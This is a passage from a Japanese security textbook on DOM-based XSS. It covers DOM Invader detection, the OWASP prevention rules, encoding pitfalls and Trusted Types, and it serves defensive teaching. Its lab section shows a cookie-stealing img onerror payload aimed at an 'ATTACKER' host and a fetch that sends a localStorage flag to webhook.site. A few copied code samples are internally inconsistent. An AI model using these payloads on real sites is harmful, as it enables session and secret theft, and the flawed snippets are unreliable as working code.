# DOMベースXSS の検出・防御・実戦ラボ（後編）

> **この節で分かること**
> - Burp Suite の DOM Invader を使って source から sink への汚染フローを実時間で観測できる
> - OWASP の DOM XSS 対策ルール（RULE #1〜#7、GUIDELINE #1〜#10）が「なぜエンコードだけでは守れないか」を説明できる
> - 「普通は安全」とされるメソッド（`innerText` など）が状況次第で危険になる落とし穴を見抜ける
> - Trusted Types（`require-trusted-types-for 'script'`）で DOM XSS を根本から封じる手順を実行できる
> - PortSwigger の各 DOM 系ラボの脆弱コード・攻撃ペイロード・原理を読み解ける
> - DOM XSS の検出を自分の手順に落とし込み、許可された範囲だけで検証できる

**元資料**: https://qiita.com/nozomi2025/items/909d552cec761c6412f2 （原典は取得できず二次情報ベース。DOM Invader・OWASP チートシート・web.dev・PortSwigger ラボの各一次資料で代替補完）
**関連する節**: 「DOMベースXSS の source / sink 完全解説（前編）」（本節はその後編。前編で定義・source/sink 一覧・正規表現検索を扱う）

---

この節は同一テーマの後編である。前編（別ユニット）が「DOMベースXSS とは何か（第三の種類のXSS）」「source と sink の一覧」「正規表現での静的検索」を扱っているので、ここでは最小限の前提だけ確認しておく。

DOMベースXSS（DOM Based XSS）とは、サーバが返すHTMLではなく、**ブラウザ内で動くJavaScriptが、攻撃者に左右される入力（source, ソース）を、文字列をコードやマークアップとして解釈する危険な出力点（sink, シンク）に無検証で渡す**ことで起きる注入欠陥のこと。source の例は `location.search`・`location.hash`・`document.cookie`・`window.name`・`postMessage` の `event.data` など。sink の例は `eval()`・`innerHTML`・`document.write()`・jQuery の `html()` など。source から sink までの間に検証や無害化がない「汚染フロー（taint flow）」が脆弱性の本体である。

本節では、この汚染フローを (1) どう見つけるか（DOM Invader）、(2) どう塞ぐか（OWASP のルールと Trusted Types）、(3) 実際のラボでどんなコードとペイロードになるか、の順で見ていく。

---

## 1. 検出: Burp Suite の DOM Invader

### DOM Invader とは何か

DOM Invader とは、Burp Suite に内蔵された Chromium ブラウザにあらかじめ組み込まれているブラウザ拡張のこと。**JavaScript の source と sink を自動的に計装（instrument, 実行時に監視コードを差し込むこと）**し、DOM XSS やその他のクライアントサイド脆弱性（prototype pollution, DOM clobbering など）の発見を助ける。追加インストールは不要で、有効化するだけで使える。

なぜこういうツールが必要なのか。DOM XSS は、送受信されるHTTPレスポンスの本文に攻撃文字列が現れないことが多く、ページ遷移中のJavaScriptの内部でだけ汚染が起きる。そのため、通信を眺めるプロキシや外形的なスキャナでは最も見つけにくい。DOM Invader は「ブラウザの中で実際に値がどの sink まで届いたか」を直接観測することで、この見えにくさを解消する。

DevTools（ブラウザの開発者ツール）にパネルを追加し、次のことができる。

1. **制御可能な sink を実時間で特定**する。到達したコンテキスト（属性・HTML・URL・JS）と、途中で適用された無害化処理も表示される。
2. **`postMessage()` の web message をログに記録・編集・再送**する。自動変異（auto-mutate）もできる。
3. **クライアントサイド prototype pollution の source を検出**し、gadget から sink までのチェーンをスキャンして PoC を即時生成する。
4. **DOM clobbering ベクタを発見**する（`id`/`name` の衝突でグローバル変数を上書きする類）。
5. 設定UIで挙動を細かく調整する（カスタム canary・自動注入・リダイレクト阻止・source/sink リストなど）。

### 有効化手順

原資料に記された手順は次のとおりである。

1. **Proxy ➜ Intercept ➜ Open Browser** で Burp の組み込みブラウザを開く。
2. 右上の **Burp Suite** ロゴをクリックする。隠れている場合はまずジグソーピース（拡張）のアイコンをクリックする。
3. **DOM Invader** タブで **Enable DOM Invader** を ON にし、**Reload** を押す。
4. DevTools（`F12`、または右クリック ➜ Inspect）を開いてドッキングすると、新しい **DOM Invader** パネルが現れる。

Burp は状態をプロファイル単位で記憶する。無効化は *Settings ➜ Tools ➜ Burp's browser ➜ Store settings...* から行う。

### canary の注入

**canary（カナリア）**とは、DOM Invader が追跡する目印としてページに注入する、ランダムな文字列のこと。たとえば `xh9XKYlV` のような値で、この文字列がどの sink まで届いたかを追うことで汚染フローを可視化する。炭鉱のカナリアが危険を知らせる役割に由来する。

- **Copy** して、パラメータ・フォーム・WebSocket フレーム・web message などに手動で注入する。
- **Inject URL params / Inject forms** ボタンで新しいタブを開くと、**全クエリのキー/値やフォームフィールドに canary を自動付加**してくれる。
- **空の canary を検索すると、悪用可能性に関係なくすべての sink が明らかになる**。偵察（どこに sink があるかの全体把握）に有用。

**カスタム canary（2025年時点）**: Burp **2024.12** で **Canary settings**（Burp ロゴ ➜ DOM Invader ➜ Canary）が導入された。**Randomize**（ランダム化）やカスタム文字列の設定ができる。既定の canary 文字列がたまたまページ上に自然発生する場合や、複数タブで検証する場合に、専用の値を割り当てられる。クリップボードへのコピーも可能。変更を反映するには **Reload** が必要。

### Web messages（`postMessage`）の検査

**Messages** サブタブが `window.postMessage()` の呼び出しをすべて記録し、`origin`・`source`・`data` の利用状況を表示する。`postMessage` とは、異なるオリジン（別ドメインなど）の window 間でメッセージをやり取りするブラウザ API のこと。受信側の検証が甘いと source になる。

- **Modify & resend**: メッセージをダブルクリックして `data` を編集し **Send** する（Burp Repeater のような使い勝手）。
- **Auto-fuzz**: 設定で **Postmessage interception ➜ Auto-mutate** を有効にすると、canary ベースのペイロードを生成してハンドラへ再送する。

各フィールドの読み方は次のとおり。

| フィールド | 何を見るか |
| --- | --- |
| **origin** | ハンドラが `event.origin`（送信元オリジン）を検証しているか |
| **data** | ペイロードを置く位置。使われていないなら sink は無関係 |
| **source** | iframe/window 参照の検証。厳格な origin チェックより弱いことが多い |

### Prototype Pollution の検出

**Settings ➜ Attack types ➜ Prototype pollution** で有効化する。prototype pollution（プロトタイプ汚染）とは、JavaScript の全オブジェクトが共有する `Object.prototype` に攻撃者がプロパティを書き込み、アプリ全体の挙動を歪める攻撃のこと。ワークフローは次のとおり。

1. **Browse** — URL・クエリ・ハッシュや JSON web message の中の汚染 source（`__proto__`, `constructor`, `prototype`）を DOM Invader がフラグする。
2. **Test** — *Test* をクリックすると、`Object.prototype.testproperty` が存在するはずの PoC タブが開く。

```javascript
let obj = {};
console.log(obj.testproperty); // ➜ 'DOM_INVADER_PP_POC'
```

3. **Scan for gadgets** — プロパティ名をブルートフォースし、危険な sink（例: `innerHTML`）に到達するものがあるか追跡する。gadget（ガジェット）とは、汚染されたプロパティを実際に危険な処理へ運ぶ既存コードのこと。
4. **Exploit** — gadget から sink までのチェーンが見つかると *Exploit* ボタンが現れ、source + gadget + sink を連鎖して alert を発火させる。

詳細設定（歯車アイコン）には次がある。**Remove CSP / X-Frame-Options**（gadget スキャン中も iframe を機能させる）、**Scan techniques in separate frames**（`__proto__` と `constructor` の干渉を避ける）、壊れやすいアプリ向けの**手法個別の無効化**。

### DOM Clobbering の検出

**Attack types ➜ DOM clobbering** を有効化すると、動的に生成された要素の `id`/`name` 属性がグローバル変数やフォームオブジェクトと衝突するものを監視する。たとえば `<input name="location">` は `window.location` を clobber（上書き）する。ユーザ制御のマークアップが変数の置き換えにつながるたびにエントリが生成される。

### 設定の全体像（2025年時点）

DOM Invader の設定は **Main / Attack Types / Misc / Canary** の4カテゴリに分かれる。

| カテゴリ | 主な項目 |
| --- | --- |
| **Main** | Enable DOM Invader（グローバルスイッチ）、Postmessage interception（記録のON/OFFと自動変異）、Custom Sources/Sinks（`eval`・`setAttribute` など特定 sink の個別有効/無効） |
| **Attack Types** | Prototype pollution（手法別設定あり）、DOM clobbering |
| **Misc** | Redirect prevention（クライアント側リダイレクトを止めて sink リストを失わない）、Breakpoint before redirect（リダイレクト直前でJSを止めコールスタックを検査）、Inject canary into all sources（どこにでも canary を自動注入。許可リスト設定可） |
| **Canary** | canary の閲覧/ランダム化/カスタム設定、クリップボードへのコピー。変更にはリロードが必要 |

### 実践上のコツ

原資料が挙げる実務上の注意点は次のとおり。

- **固有の canary を使う**。`test` のような一般的な文字列は誤検知を招く。
- **重い sink を一時的に無効化する**。`eval`・`innerHTML` はナビゲーション中にページ機能を壊すことがある。
- **Burp Repeater / Proxy と併用する**。脆弱な状態を生んだリクエスト/レスポンスを再現し、最終的な exploit URL を組み立てる。
- **フレームのスコープに注意する**。source/sink はブラウジングコンテキストごとに表示される。iframe 内の脆弱性は手動でフォーカスが必要な場合がある。
- **証跡をエクスポートする**。DOM Invader パネルを右クリック ➜ *Save screenshot* でレポートに添付する。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOM Invader 公式ドキュメント — https://portswigger.net/burp/documentation/desktop/tools/dom-invader
> **なぜ**: 本教科書の執筆環境からは portswigger.net 本体を自動取得できなかった（理由: サイト側の egress 制限）。上の記述は HackTricks に転載された二次情報（原典は同URL）にもとづく要約である。
> **読みどころ**:
> 1. 各設定項目の最新スクリーンショットと、ボタンの実際の配置を目で確認する
> 2. Prototype pollution / DOM clobbering のスキャン手順が Burp のバージョンごとにどう変わったか
> 3. Custom Sources/Sinks で自分の対象アプリ固有の sink をどう登録するか
> **代替手段**: HackTricks の dom-invader ページ（https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/dom-invader.md ）が同じ手順を無料で読める

---

## 2. 対策: OWASP DOM based XSS Prevention Cheat Sheet の RULE #1〜#7

ここからは防御側の話に移る。OWASP の DOM XSS 対策チートシートが示す7つのルールを、設計意図とともに読む。全体を貫く考え方は「**信頼できないデータを、どのコンテキスト（文脈）に、どういう順でエンコードして入れるか**」である。

前提として、前編で触れた2つのコンテキストを思い出したい。**レンダリングコンテキスト**は HTML タグや属性のパースに紐づく文脈で、HTML / HTML属性 / URL / CSS に細分される。**実行コンテキスト**は JavaScript パーサによるコードのパースと実行に紐づく文脈である。DOM XSS では、JavaScript コード（実行コンテキスト）の内側から、これら4つのサブコンテキストに値を書き込む。同じデータでも、どのサブコンテキストに入るかで必要なエンコードが変わる。ここが対策を難しくしている核心である。

### RULE #1 — HTML サブコンテキスト: HTML エスケープ → JavaScript エスケープ

危険な HTML メソッド/属性は次のもの。

```javascript
 element.innerHTML = "<HTML> Tags and markup";
 element.outerHTML = "<HTML> Tags and markup";
```

```javascript
 document.write("<HTML> Tags and markup");
 document.writeln("<HTML> Tags and markup");
```

これらに信頼できないデータを入れる前に、**まず HTML エンコード、次に JavaScript エンコード**の2段階を適用する。

```javascript
 var ESAPI = require('node-esapi');
 element.innerHTML = "<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>";
 element.outerHTML = "<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>";
```

```javascript
 var ESAPI = require('node-esapi');
 document.write("<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>");
 document.writeln("<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>");
```

### RULE #2 — HTML 属性サブコンテキスト: JavaScript エスケープのみ

実行コンテキストで **コードを実行しない属性**（イベントハンドラ・CSS・URL 属性以外）に値を入れる場合は、**JavaScript エンコードだけ**でよい。ここでレンダリングコンテキスト用の HTML 属性エンコードまで重ねると、表示が壊れる。

壊れてしまう例（**SAFE but BROKEN**）。

```javascript
 var ESAPI = require('node-esapi');
 var x = document.createElement("input");
 x.setAttribute("name", "company_name");
 // In the following line of code, companyName represents untrusted user input
 // The ESAPI.encoder().encodeForHTMLAttribute() is unnecessary and causes double-encoding
 x.setAttribute("value", '<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTMLAttribute(companyName))%>');
 var form1 = document.forms[0];
 form1.appendChild(x);
```

`companyName` が `"Johnson & Johnson"` だと、入力欄には `"Johnson &#x26;amp; Johnson"` と二重エンコードされて表示される。正しいのは JavaScript エンコードのみ。

```javascript
 var ESAPI = require('node-esapi');
 var x = document.createElement("input");
 x.setAttribute("name", "company_name");
 x.setAttribute("value", '<%=ESAPI.encoder().encodeForJavascript(companyName)%>');
 var form1 = document.forms[0];
 form1.appendChild(x);
```

値は HTML 要素のオブジェクト属性に直接セットされるため、「上方向への注入（新しいタグへ脱出する類）」の懸念がない。だから JavaScript エンコードだけで足りる。

### RULE #3 — イベントハンドラ / JS コードサブコンテキスト: JavaScript エンコードは防御にならない

これが最重要のルールである。原文の指摘は「**a JavaScript encoded string will execute even though it is JavaScript encoded.**」——JavaScript エンコードされた文字列は、エンコードされていても**実行される**。したがって第一の推奨は「**この文脈に信頼できないデータを入れないこと**」そのものである。

なぜエンコードが効かないのか。`setAttribute` の例で見る。

```javascript
var x = document.createElement("a");
x.href="#";
// In the line of code below, the encoded data on the right (the second argument to setAttribute)
// is an example of untrusted data that was properly JavaScript encoded but still executes.
x.setAttribute("onclick", "alert(22)");
var y = document.createTextNode("Click To Test");
x.appendChild(y);
document.body.appendChild(x);
```

`setAttribute(name_string, value_string)` は、**`value_string` を `name_string` の DOM 属性データ型へ暗黙に型強制する**。属性名が `onclick` のようなイベントハンドラなので、値は暗黙に JavaScript コードへ変換されて評価される。同じ問題を持つのが `setTimeout`・`setInterval`・`new Function` など、文字列でコードを受け取るメソッド群である。

これは、HTML タグのイベントハンドラ属性（HTMLパーサが処理する側）では JavaScript エンコードが XSS を緩和できるのと**対照的**である。次の HTMLパーサ経由なら効く例。

```html
<!-- Does NOT work  -->
<a id="bb" href="#" onclick="alert(1)"> Test Me</a>
```

一方、`Element.setAttribute(...)` を使わず**属性を直接設定**すれば、JavaScript エンコードが DOM XSS を緩和できる。

```html
<a id="bb" href="#"> Test Me</a>
```

```javascript
//The following does NOT work because the event handler is being set to a string.
//"alert(7)" is JavaScript encoded.
document.getElementById("bb").onclick = "alert(7)";

//The following does NOT work because the event handler is being set to a string.
document.getElementById("bb").onmouseover = "testIt";

//The following does NOT work because of the encoded "(" and ")".
//"alert(77)" is JavaScript encoded.
document.getElementById("bb").onmouseover = alert(77);

//The following example is tricky
// first testIt will be assigned as an onmousehover event handler, The second testIt will fire while parsing.
// because second testIt is a separate js statement
// this happen because of ; separator
//"testIt;testIt" is JavaScript encoded.
document.getElementById("bb").onmouseover = testIt;tes
                                            tIt;

//The following DOES WORK because the encoded value is a valid variable name or function reference.
//"testIt" is JavaScript encoded
document.getElementById("bb").onmouseover = testIt;

function testIt() {
   alert("I was called.");
}
```

JavaScript のなかでは、エンコードされた文字列でも有効な実行可能コードとして受理されてしまう例。

```javascript
 for(var b=0; b < 10; b++){
     document
     .writeln
     ("Hello World");
 }
 window
 .eval
 document
 .write(111111111);
```

```javascript
 var s = "eval";
 var t = "alert(11)";
 window[s](t);
```

なぜこうなるのか。JavaScript は国際標準（ECMAScript）にもとづき、JavaScript エンコードは**プログラム構成要素や変数における国際文字のサポートと、文字列の別表現（string escapes）**を許すために設計されている。つまり「同じ意味を別の書き方で表す」ことがそもそも仕様に含まれている。HTML エンコードは逆で、HTML タグ要素は厳密に定義され、**同じタグの別表現を許さない**。

この違いを示すのが「HTML Encoding's Disarming Nature（HTMLエンコードの無力化性質）」である。動くリンク。

```html
<a href="..." >
```

普通にHTMLエンコードした場合（動かない, Does Not Work = DNW）。

```html
&#x3c;a href=... &#x3e;
```

タグ名の一部だけをHTMLエンコードした場合（DNW）。

```html
<&#x61; href=...>
```

もし HTML エンコードが JavaScript エンコードと同じ意味論なら、この行はリンクを描画できたはずである。しかし HTML では通用しない。この差が、XSS との戦いにおいて **JavaScript エンコードをより頼りにならない武器**にしている。

### RULE #4 — CSS 属性サブコンテキスト: URL エンコード → JavaScript エンコード

CSS から JavaScript を実行するには、CSS の `url()` に `javascript:attackCode()` を渡すか、`expression()` を呼ぶ必要がある。実行コンテキスト（JavaScript）からの `expression()` は無効化されている。CSS `url()` に渡すデータは **URL エンコード**する。

```javascript
var ESAPI = require('node-esapi');
document.body.style.backgroundImage = "url(<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(companyName))%>)";
```

### RULE #5 — URL 属性サブコンテキスト: URL エスケープ → JavaScript エスケープ

URL をパースするロジックは実行/レンダリングの両コンテキストでほぼ同じなので、エンコード規則もほとんど変わらない。

```javascript
var ESAPI = require('node-esapi');
var x = document.createElement("a");
x.setAttribute("href", '<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(userRelativePath))%>');
var y = document.createTextElement("Click Me To Test");
x.appendChild(y);
document.body.appendChild(x);
```

注意: 完全修飾URL（`http://...` のような形）に対して使うとリンクが壊れる。プロトコル識別子のコロン（`http:` や `javascript:`）まで URL エンコードされ、プロトコルが起動できなくなるためである。

### RULE #6 — 安全な JavaScript 関数/プロパティで DOM を埋める

最も基本的に安全なのは、コードとして解釈されない代入プロパティ **`textContent`** を使うこと。`textContent` とは、要素の中身を「純粋なテキスト」として設定・取得するプロパティのこと。HTMLタグを書いても、そのままの文字として表示される。

```html
<script>
element.textContent = untrustedData;  //does not execute code
</script>
```

### RULE #7 — DOM XSS の修正法

原文は明快に言い切る。「**The best way to fix DOM based cross-site scripting is to use the right output method (sink).**」——`div` にユーザ入力を書きたいなら `innerHTML` を使わず **`innerText` か `textContent`** を使う。これが正しい修正法である。

さらに `eval` について強い警告がある。「**It is always a bad idea to use a user-controlled input in dangerous sources such as eval. 99% of the time it is an indication of bad or lazy programming practice, so simply don't do it instead of trying to sanitize the input.**」——`eval` のような危険な場所にユーザ制御入力を使うのは常に悪手。99%は下手・怠惰なプログラミングの兆候であり、**サニタイズを試みるのではなく、単にやめる**べきである。

---

## 3. 対策: GUIDELINE #1〜#10（安全に作るための指針）

RULE が「エンコードの順序」を扱うのに対し、GUIDELINE は「そもそもどう書くか」という設計方針を示す。

| # | 指針 | 要点 |
| --- | --- | --- |
| #1 | Untrusted data should only be treated as displayable text | 信頼できないデータは**表示可能なテキストとしてのみ**扱う。コードやマークアップとして扱わない |
| #2 | Always JavaScript encode and delimit untrusted data as quoted strings | テンプレート化した JS を組む際は、入口で常に JavaScript エンコードし、**引用符で囲んだ文字列として区切る** |
| #3 | Use `document.createElement`, `element.setAttribute`, `element.appendChild` etc. | 動的UIは DOM API で組む。ただし `element.setAttribute` は**限られた属性でのみ安全**。危険なのは `onclick`・`onblur` などコマンド実行コンテキストになる全属性 |
| #4 | Avoid sending untrusted data into HTML rendering methods | `innerHTML`・`outerHTML`・`document.write`・`document.writeln` に信頼できないデータを入れない |
| #5 | Avoid the numerous methods which implicitly `eval()` data | 暗黙に `eval()` するメソッドを避ける。渡すなら (1) 文字列デリミタで区切り (2) クロージャで囲むか N 段 JS エンコードし (3) カスタム関数でラップする |
| #6 | Use untrusted data on only the right side of an expression | 式の**右辺だけ**に使う。特に `location` や `eval()` に渡りうるデータ |
| #7 | When URL encoding in DOM be aware of character set issues | DOM で URL エンコードする際は**文字集合の問題**に注意（DOM の文字集合は明確に定義されていない。指摘: Mike Samuel） |
| #8 | Limit access to object properties when using `object[x]` accessors | `object[x]` アクセサ使用時はプロパティアクセスを制限。**入力と指定プロパティの間に間接層を1枚**入れる（指摘: Mike Samuel） |
| #9 | Run your JavaScript in a ECMAScript 5 canopy or sandbox | ECMAScript 5 の canopy / サンドボックスで動かし、API 侵害を難しくする（Gareth Heyes, John Stevens） |
| #10 | Don't `eval()` JSON to convert it to native JavaScript objects | `JSON.parse()` / `JSON.stringify()` を使う。`JSON.parse()` は有効な JSON 以外を拒否するので攻撃者コードを実行しない |

### GUIDELINE #3 の「安全な属性」一覧

`setAttribute` を使ってよい属性は、原文では次のように限定列挙されている。これ以外（特にイベントハンドラや `href`・`src`・`style`）は危険と考える。

```text
align, alink, alt, bgcolor, border, cellpadding, cellspacing, class, color,
cols, colspan, coords, dir, face, height, hspace, ismap, lang, marginheight,
marginwidth, multiple, nohref, noresize, noshade, nowrap, ref, rel, rev,
rows, rowspan, scrolling, shape, span, summary, tabindex, title, usemap,
valign, value, vlink, vspace, width
```

### GUIDELINE #2 のコード

```javascript
var x = "<%= Encode.forJavaScript(untrustedData) %>";
```

### GUIDELINE #5: クロージャと N 段エンコード

暗黙に `eval()` するメソッド（`setTimeout` など）に安全に値を渡す方法。Gaz（Gareth）が提案するクロージャ方式。

```javascript
 var ESAPI = require('node-esapi');
 setTimeout((function(param) { return function() {
          customFunction(param);
        }
 })("<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>"), y);
```

N 段エンコードで渡す方式。

```javascript
setTimeout("customFunction('<%=doubleJavaScriptEncodedData%>', y)");
function customFunction (firstName, lastName)
     alert("Hello" + firstName + " " + lastName);
}
```

仕組みはこうである。`doubleJavaScriptEncodedData` は、実行時にシングルクォート内で1層目の JavaScript エンコードが解かれ、`setTimeout` の暗黙 `eval` がもう1層を解いて `customFunction` に正しい値を渡す。**二重で足りるのは、`customFunction` がその入力をさらに `eval` 系へ渡していないから**である。もし `firstName` が別の（暗黙/明示に `eval()` する）メソッドへ渡されるなら、三重エンコード（`<%=tripleJavaScriptEncodedData%>`）が要る。

重要な副作用として、二重・三重エンコードした値を**文字列比較に使うと**、通過した `eval()` の回数とエンコード回数に応じて解釈が変わる。次の `if` は false になる。

```javascript
 var x = "doubleJavaScriptEncodedA";  //A
 if (x == "A") {
    alert("x is A");
 } else if (x == "A") {
    alert("This is what pops");
 }
```

理想的な設計は、**データがアプリに入る出力コンテキストに対してサーバ側でエンコードし、次に信頼できないデータが渡される個々のサブコンテキスト（DOMメソッド）に対してクライアント側でエンコードする**という二段構えである。

```javascript
//server-side encoding
var ESAPI = require('node-esapi');
var input = "<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>";
```

```javascript
//HTML encoding is happening in JavaScript
var ESAPI = require('node-esapi');
document.writeln(ESAPI.encoder().encodeForHTML(input));
```

Gaz 提案の、無名クロージャで可変性を制限したエスケープ実装例。

```javascript
function escapeHTML(str) {
     str = str + "''";
     var out = "''";
     for(var i=0; i<str.length; i++) {
         if(str[i] === '<') {
             out += '&lt;';
         } else if(str[i] === '>') {
             out += '&gt;';
         } else if(str[i] === "'") {
             out += '&#39;';
         } else if(str[i] === '"') {
             out += '&quot;';
         } else {
             out += str[i];
         }
     }
     return out;
}
```

### GUIDELINE #6 の例

```javascript
window[userDataOnLeftSide] = "userDataOnRightSide";
```

式の**左辺**に信頼できないデータを使うと、攻撃者が window オブジェクトの内部/外部属性を覆せる。右辺に使う分には直接操作を許さない。だから「右辺だけに使え」となる。

### GUIDELINE #8 の例

問題のあるコード。

```javascript
var myMapType = {};
myMapType[<%=untrustedData%>] = "moreUntrustedData";
```

より良い方法（間接層を1枚入れる）。

```javascript
if (untrustedData === 'location') {
  myMapType.location = "moreUntrustedData";
}
```

### GUIDELINE #9 のサンドボックス/サニタイザ一覧

- js-xss — https://github.com/leizongmin/js-xss
- sanitize-html — https://github.com/apostrophecms/sanitize-html
- DOMPurify — https://github.com/cure53/DOMPurify
- MDN - HTML Sanitizer API — https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API
- OWASP Summit 2011 - DOM Sandboxing — https://owasp.org/www-pdf-archive/OWASPSummit2011DOMSandboxingBrowserSecurityTrack.pdf
- ECMAScript 5 canopy — https://github.com/jcoglan/canopy

### GUIDELINE #10 の警告

`JSON.stringify()` を安全なエンコード関数と勘違いしないこと。原文の警告。

> `JSON.stringify()` is **not** an output-encoding function. Its output is valid JSON but is not safe to embed directly in an HTML, HTML-attribute, or inline `<script>` context — characters like `<`, `>`, `&`, `"`, `'` can break out of the surrounding context and enable XSS. When embedding the output of `JSON.stringify()` in a page, either (a) deliver it as a separate JSON response and parse it client-side with `JSON.parse()`, or (b) HTML-encode (or JavaScript-string-encode, depending on the sink) the serialized string before injecting it.

つまり、`JSON.stringify()` の出力は「別の JSON レスポンスとして返して `JSON.parse()` で読む」か、「sink に応じてエンコードしてから埋め込む」かのどちらかにする。

---

## 4. DOM XSS 緩和でよく踏む落とし穴

対策を「エンコードすればよい」で済ませようとすると、以下の4つの穴に落ちる。

### 4.1 Complex Contexts（文脈が入れ替わる）

一つの値が、レンダリング → 実行 → 実行URL、と複数のコンテキストを渡り歩くケース。

```html
<a href="javascript:myFunction('<%=untrustedData%>', 'test');">Click Me</a>
 ...
<script>
Function myFunction (url,name) {
    window.location = url;
}
</script>
```

このデータは、**レンダリングURLコンテキスト**（`a` の `href`）で始まり、**JavaScript 実行コンテキスト**（`javascript:` プロトコルハンドラ）に移り、そこから**実行URLサブコンテキスト**（`myFunction` 内の `window.location`）へ渡る。正しいサーバ側エンコードは URL エンコードと JavaScript エンコードの合成。

```html
<a href="javascript:myFunction('<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(untrustedData)) %>', 'test');">
Click Me</a>
```

あるいは、サーバ側は JavaScript エンコードのみとし、クライアント側で URL エンコードする方式。

```html
<!-- server side URL encoding has been removed.  Now only JavaScript encoding on server side. -->
<a href="javascript:myFunction('<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>', 'test');">Click Me</a>
 ...
<script>
Function myFunction (url,name) {
    var encodedURL = ESAPI.encoder().encodeForURL(url);  //URL encoding using client-side scripts
    window.location = encodedURL;
}
</script>
```

### 4.2 Inconsistencies of Encoding Libraries（ライブラリの不統一）

代表的なエンコードライブラリ。

1. OWASP ESAPI — https://owasp.org/www-project-enterprise-security-api/
2. OWASP Java Encoder — https://owasp.org/www-project-java-encoder/
3. Apache Commons Text `StringEscapeUtils`（Apache Commons Lang3 の同名クラスの置き換え）
4. Jtidy — http://jtidy.sourceforge.net/
5. 自社独自実装

問題は、あるものは**拒否リスト（denylist）**で動き、あるものは `&lt;`・`&gt;` のような重要な文字を無視する点。Java Encoder は HTML/CSS/JavaScript エンコードをサポートする活発なプロジェクト。**ESAPI は許可リスト（allowlist）で動作し、英数字以外のすべての文字をエンコードする数少ないライブラリの一つ**。allowlist（許可リスト）とは「安全と分かっているものだけ通す」方式、denylist（拒否リスト）とは「危険と分かっているものだけ弾く」方式のこと。後者は見落としが起きやすい。

### 4.3 Encoding Misconceptions（エンコードに関する誤解）

「HTML エンコードを盲目的に使えば XSS は解決する」は誤りである。返すページの Content-Type が `text/xhtml` だったり拡張子が `*.xhtml` だったりすると、HTML エンコードは緩和にならない。

```html
<script>
&#x61;lert(1);
</script>
```

この HTML エンコード値は**依然として実行可能**。さらに、**DOM 要素の `value` 属性から取得するとエンコードが失われる**という罠がある。

```html
<form name="myForm" ...>
  <input type="text" name="lName" value="<%=ESAPI.encoder().encodeForHTML(last_name)%>">
 ...
</form>
<script>
  var x = document.myForm.lName.value;  //when the value is retrieved the encoding is reversed
  document.writeln(x);  //any code passed into lName is now executable.
</script>
```

サーバ側で HTML エンコードして埋めても、JavaScript で `.value` を読むとデコードされた生の値が返り、それを `document.writeln` に渡すと実行される。

### 4.4 Usually Safe Methods（「普通は安全」なメソッドの罠）

`innerText` は `innerHTML` の代替として安全と説く文献があるが、**適用するタグによってはコードが実行される**。

```html
<script>
 var tag = document.createElement("script");
 tag.innerText = "<%=untrustedData%>";  //executes code
</script>
```

`script` 要素に `innerText` で代入すると、その中身は JavaScript として実行されてしまう。`innerText` は元々 Internet Explorer が導入し、主要ブラウザに採用された後、**2016年に HTML 標準で正式に仕様化**された。「安全」と言われるメソッドでも、対象要素の種類まで確認する習慣が必要である。

---

## 5. 実戦パターン: 部分的サニタイズの隙と stored DOM XSS

現場でよく見つかるのが「一部のフィールドだけをサニタイズし、別のフィールドを `innerHTML` にそのまま補間する」フロントエンドである。

```javascript
fetch(`${window.location.origin}/admin/bug_reports`).then(r => r.json()).then(reports => {
  reports.forEach(report => {
    reportCard.innerHTML = `
      <div>${DOMPurify.sanitize(report.id)}</div>
      <div>${report.details}</div> <!-- unsanitized sink -->
    `;
  });
});
```

`report.id` は DOMPurify で無害化しているのに、`report.details` は素通しである。このサニタイズされないフィールドがサーバ側に保存されると、**そのリストを開く特権ユーザ（管理者など）に対する stored DOM XSS** になる。stored（格納型）とは、攻撃文字列がサーバに保存され、後で別のユーザが閲覧したときに発火する形のこと。次のようなペイロードが管理者のページ閲覧時に実行され、クッキーを外部送信する。

```html
<img src=x onerror=fetch('http://ATTACKER/?c='+document.cookie)>
```

さらに、アプリが `SESSION_COOKIE_HTTPONLY` を明示的に無効化している場合（例: Flask で `app.config['SESSION_COOKIE_HTTPONLY'] = False`）、盗んだクッキーは**署名鍵が起動ごとにローテートしても**直ちに管理者セッションを与える。ランダムな `secret_key` はクッキーの偽造を防ぐが、正規のクッキーそのものの窃取は防げないからである。HttpOnly 属性は「JavaScript からクッキーを読めなくする」防御なので、これを外している時点で XSS からのクッキー窃取に対して無防備になる。

### 自動化ボット（Playwright 等）のフローを突く

バグバウンティのラボやアプリでは、自動化ボット（Playwright など）が内部ページを先に訪れて `localStorage`/クッキーに秘密（フラグなど）を入れ、その後ユーザ指定URLへ遷移することが多い。そのフローに DOM XSS プリミティブがあると、仕込まれた秘密を外部へ流出させられる。

```javascript
fetch('https://webhook.site/<id>?flag=' + encodeURIComponent(localStorage.getItem('flag')))
```

ボットが遷移先スキームを制限していない場合、`javascript:` URL（`javascript:fetch(...)`）を与えると**新規ナビゲーションなしに現在のオリジンで実行**され、ストレージの値が直接漏れる。`window.name` の濫用もこの類のフローで使われる。

---

## 6. 根本対策: Trusted Types

エンコードを正しく使い分けるのは、ここまで見たとおり難しい。根本から解決するのが Trusted Types（トラステッドタイプ）である。

### 何をする機構か

Trusted Types とは、**DOM XSS の sink に「ただの文字列」を渡せなくする**ブラウザ機構のこと。`innerHTML` などの危険な sink は、`TrustedHTML` という特別な型のオブジェクトしか受け付けなくなる。この型は「ポリシー」を通してしか作れないので、危険な代入が起きる場所がポリシー内の数箇所に集約される。

導入は段階的に行う。まず**報告モード**で違反を洗い出してから、**強制モード**に切り替える。報告モードのヘッダは次のとおり。

```text
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-uri //my-csp-endpoint.example
```

違反レポートの `violated-directive` は `require-trusted-types-for` になる。

### 違反の直し方は4通り

